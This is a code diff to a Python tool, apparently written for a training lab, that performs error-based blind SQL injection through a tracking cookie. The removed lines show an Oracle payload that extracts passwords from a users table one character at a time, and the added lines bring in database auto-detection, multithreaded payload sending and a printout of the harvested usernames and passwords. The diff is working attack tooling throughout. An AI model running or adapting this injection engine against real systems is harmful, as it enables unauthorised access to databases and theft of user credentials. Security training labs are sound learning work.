@@ -11,7 +11,8 @@ try:
         build_charset, make_session, make_proxies, timestamp_log_name,
         prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
         prompt_users, prompt_length, prompt_proxy, prompt_workers,
-        prompt_special, prompt_timeout
+        prompt_special, prompt_timeout, prompt_dbms,
+        build_error_payload, build_error_probe,
     )
 except ImportError:
     from common import (
@@ -19,7 +20,8 @@ except ImportError:
         build_charset, make_session, make_proxies, timestamp_log_name,
         prompt_url, prompt_tracking, prompt_cookie_name, prompt_session_cookie,
         prompt_users, prompt_length, prompt_proxy, prompt_workers,
-        prompt_special, prompt_timeout
+        prompt_special, prompt_timeout, prompt_dbms,
+        build_error_payload, build_error_probe,
     )
 
 
@@ -40,16 +42,7 @@ class ErrorSQLiEngine:
         self.proxies = make_proxies(args.proxy)
         self.charset = build_charset(self.use_special)
         self.session = make_session()
-
-    def _build_char_payload(self, user, position, char):
-        return (
-            f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) "
-            f"ELSE '' END from users where username='{user}' "
-            f"and SUBSTR(password,{position},1)='{char}') || '"
-        )
-
-    def _build_probe_payload(self):
-        return f"{self.base_id}' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '"
+        self.dbms = (getattr(args, "dbms", "auto") or "auto").lower()
 
     def _send_request(self, payload):
         cookies = {self.cookie_name: payload}
@@ -66,10 +59,23 @@ class ErrorSQLiEngine:
             self.logger.debug(f"Request failed: {e}")
             return False
 
+    def _detect_dbms(self):
+        log_info("Auto-detecting DBMS (error-based)...")
+        for dbms in ["oracle", "mssql", "mysql"]:
+            payload = build_error_probe(dbms, self.base_id)
+            if self._send_request(payload):
+                log_info(f"Detected DBMS: {Fore.CYAN}{dbms}{Style.RESET_ALL}")
+                return dbms
+        log_warn("Auto-detect failed; falling back to 'oracle'.")
+        return "oracle"
+
     def _probe(self):
-        log_info("Probing Error-based injection (Oracle TO_CHAR(1/0))...")
-        if self._send_request(self._build_probe_payload()):
-            log_info("Error payload confirmed (HTTP 500 / Internal Server Error)")
+        log_info("Probing Error-based injection...")
+        if self.dbms == "auto":
+            self.dbms = self._detect_dbms()
+        payload = build_error_probe(self.dbms, self.base_id)
+        if self._send_request(payload):
+            log_info(f"Error payload confirmed (HTTP 500 / Internal Server Error, dbms: {self.dbms})")
             return True
         log_error("Error probe failed. Check URL/cookie/session.")
         return False
@@ -79,7 +85,8 @@ class ErrorSQLiEngine:
         with ThreadPoolExecutor(max_workers=self.workers) as ex:
             futs = {}
             for c in self.charset:
-                futs[ex.submit(self._send_request, self._build_char_payload(user, position, c))] = c
+                p = build_error_payload(self.dbms, self.base_id, user, position, c)
+                futs[ex.submit(self._send_request, p)] = c
             for fut in as_completed(futs):
                 c = futs[fut]
                 try:
@@ -126,7 +133,7 @@ class ErrorSQLiEngine:
 
     def _summary(self, results):
         print(f"\n{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA} FINAL RESULTS — ERROR MODE {Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA} FINAL RESULTS — ERROR MODE ({self.dbms}) {Style.RESET_ALL}")
         print(f"{Fore.MAGENTA}{'='*40}{Style.RESET_ALL}")
         for u, p in results.items():
             print(f"{Fore.CYAN}{u:15} {Style.RESET_ALL} : {Fore.GREEN}{p}{Style.RESET_ALL}")
@@ -144,6 +151,7 @@ def interactive():
     args.session = prompt_session_cookie()
     args.users = prompt_users()
     args.length = prompt_length()
+    args.dbms = prompt_dbms()
     args.proxy = prompt_proxy()
     args.workers = prompt_workers(default=1)
     args.timeout = prompt_timeout()
@@ -153,7 +161,7 @@ def interactive():
 
 
 def build_parser():
-    p = argparse.ArgumentParser(description="Error-based Blind SQLi (HTTP 500 lab)")
+    p = argparse.ArgumentParser(description="Error-based Blind SQLi (HTTP 500 lab)", add_help=False)
     p.add_argument("-u", "--url", required=True)
     p.add_argument("-t", "--tracking", default="182--")
     p.add_argument("-c", "--cookie", default="TrackingId")
@@ -165,6 +173,7 @@ def build_parser():
     p.add_argument("-T", "--timeout", type=int, default=15)
     p.add_argument("-s", "--special", action="store_true")
     p.add_argument("-o", "--log", default=timestamp_log_name("error_sqli"))
+    p.add_argument("-db", "--dbms", default="auto", choices=["auto", "mysql", "postgres", "oracle", "mssql", "sqlite"])
     return p
 
 
@@ -177,7 +186,6 @@ def main():
     if not args.url.startswith(("http://", "https://")):
         log_error("URL must start with http:// or https://")
         sys.exit(1)
-
     if not args.length or args.length <= 0:
         log_error("Password length (-l) is required and must be positive.")
         sys.exit(1)
